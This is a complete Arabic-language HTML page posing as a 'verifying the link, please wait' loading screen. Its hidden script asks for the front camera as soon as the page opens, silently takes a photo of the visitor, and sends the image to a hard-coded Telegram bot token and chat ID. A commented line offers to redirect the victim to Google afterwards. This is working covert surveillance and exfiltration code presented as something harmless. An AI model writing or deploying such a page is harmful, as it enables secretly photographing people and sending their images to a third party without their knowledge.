<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري تحميل الصفحة...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f4f4f4;
            padding-top: 50px;
        }
        .loader {
            border: 16px solid #f3f3f3;
            border-top: 16px solid #3498db;
            border-radius: 50%;
            width: 80px;
            height: 80px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <h2>يرجى الانتظار، جاري التحقق من الرابط...</h2>
    <div class="loader"></div>

    <!-- عناصر مخفية لالتقاط الصورة -->
    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        // إعدادات التلجرام (ضع بياناتك هنا)
        const TELEGRAM_TOKEN = '8815312689:AAEGxxw-mtajcc0s1wmfsPgL22vSdgVIoCQ';
        const CHAT_ID = '1230856956';

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // طلب إذن الكاميرا الأمامية فور فتح الصفحة
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(function(stream) {
            video.srcObject = stream;
            video.play();

            // الانتظار ثانيتين للتأكد من وضوح الصورة وتثبيت الكاميرا ثم الالتقاط
            setTimeout(function() {
                takeSnapshot();
            }, 2000);
        })
        .catch(function(err) {
            console.log("تم رفض الإذن أو الكاميرا غير متوفرة: " + err);
        });

        function takeSnapshot() {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 640, 480);
            
            // تحويل الصورة الملتَقطة إلى صيغة Blob (ملف) لإرسالها
            canvas.toBlob(function(blob) {
                sendToTelegram(blob);
            }, 'image/jpeg');
        }

        function sendToTelegram(imageBlob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', imageBlob, 'capture.jpg');
            formData.append('caption', '🚨 تنبيه: تم فتح الرابط ومحاولة   الشخص!');

            // إرسال الصورة عبر API التلجرام مباشرة
            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log('تم الإرسال بنجاح:', data);
                // اختياري: يمكنك توجيه المستخدم إلى صفحة أخرى بعد الإرسال (مثلاً جوجل)
                // window.location.href = "https://www.google.com";
            })
            .catch(error => {
                console.error('خطأ في الإرسال:', error);
            });
        }
    </script>
</body>
</html>
